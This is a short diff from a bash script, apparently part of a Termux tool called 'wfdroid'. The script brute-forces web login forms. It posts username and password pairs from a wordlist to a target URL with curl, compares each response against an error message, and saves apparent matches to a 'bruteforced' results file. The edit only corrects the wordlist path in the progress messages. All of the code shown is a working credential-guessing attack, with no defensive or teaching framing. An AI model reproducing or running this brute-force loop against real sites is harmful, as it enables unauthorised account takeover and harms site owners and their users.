@@ -28,10 +28,10 @@ for passw in $(cat /data/data/com.termux/files/usr/share/wfdroid/list/$wlist); d
 	brute=$(curl -i -L -s --data-urlencode  $inpusr=$username --data-urlencode $inppwd=$passw $url)
 	if [[ $brute =~ $errmsg ]];
 	then
-		echo '['$i'/'$(wc -l < $wlist)'] TRYING BRUTEFORCE.';
+		echo '['$i'/'$(wc -l < /data/data/com.termux/files/usr/share/wfdroid/list/$wlist)'] TRYING BRUTEFORCE.';
 
 	else
-		echo '['$i'/'$(wc -l < $wlist)'] MAYBE FOUND!! '$username'|'$passw;
+		echo '['$i'/'$(wc -l < /data/data/com.termux/files/usr/share/wfdroid/list/$wlist)'] MAYBE FOUND!! '$username'|'$passw;
 		echo $url'|'$username'|'$passw >> /data/data/com.termux/files/usr/share/wfdroid/done/bruteforced_$(date +%d_%m_%Y).txt;
 	fi
 done
